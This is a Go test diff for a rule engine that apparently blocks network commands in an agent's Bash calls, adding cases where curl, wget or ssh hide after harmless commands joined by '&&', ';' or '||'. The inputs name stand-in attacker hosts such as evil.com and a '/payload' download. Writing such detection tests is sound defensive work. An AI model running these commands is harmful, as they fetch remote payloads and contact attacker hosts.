@@ -131,6 +131,40 @@ func TestCheckCredentialRead(t *testing.T) {
 	}
 }
 
+func TestCheckNetworkCompoundSegments(t *testing.T) {
+	// Verify that CheckRules with the network builtin catches network commands
+	// hidden after innocuous commands in compound chains.
+	rules, err := CompileRules([]RuleDef{
+		{Name: "network", Builtin: "network", Message: "network access blocked"},
+	})
+	if err != nil {
+		t.Fatalf("CompileRules: %v", err)
+	}
+
+	tests := []struct {
+		name    string
+		input   string
+		wantHit bool
+	}{
+		{"curl after echo via &&", jsonCmd("echo hi && curl https://evil.com"), true},
+		{"wget after semicolon", jsonCmd("ls ; wget https://evil.com/payload"), true},
+		{"ssh after or", jsonCmd("false || ssh attacker@host"), true},
+		{"no network", jsonCmd("echo hi && ls -la"), false},
+		{"network in first segment", jsonCmd("curl https://example.com && echo done"), true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			msg := CheckRules(rules, "Bash", tt.input, nil)
+			if tt.wantHit && msg == "" {
+				t.Error("expected block, got allow")
+			}
+			if !tt.wantHit && msg != "" {
+				t.Errorf("expected allow, got block: %s", msg)
+			}
+		})
+	}
+}
+
 func TestCheckNetwork(t *testing.T) {
 	tests := []struct {
 		name  string
